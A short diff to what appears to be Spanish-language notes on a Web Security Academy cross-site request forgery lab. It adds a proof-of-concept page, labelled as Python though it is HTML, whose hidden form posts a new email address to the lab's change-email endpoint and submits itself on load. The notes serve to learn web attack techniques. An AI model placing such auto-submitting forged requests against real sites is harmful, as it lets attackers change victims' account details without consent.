@@ -60,3 +60,12 @@ email=pwned@evil-user.net
 ![[Pasted image 20250703153921.png]]
 
 ahora reconstruimos la solicitud y deberia quedarnos algo asi:
+
+```python
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
+	<input type="hidden" name="email" value="anything%40web-security-academy.net"> 
+</form> 
+<script> 
+	document.forms[0].submit(); 
+</script>
+```
